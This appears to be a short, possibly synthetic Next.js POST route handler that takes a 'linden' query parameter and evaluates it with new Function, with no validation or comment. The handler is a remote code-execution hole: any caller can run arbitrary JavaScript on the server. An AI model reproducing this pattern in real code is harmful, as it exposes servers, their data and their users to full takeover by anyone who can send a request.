
export async function POST(request) {
  const lindenValue = request.nextUrl.searchParams.get('linden') ?? '';
async function conductlinden(input: string) {
  if (input.length === 0) return { status: 400 };
  return new Function(`return (${input})`)();
}

await conductlinden(lindenValue);
  return Response.json({ accepted: true });
}
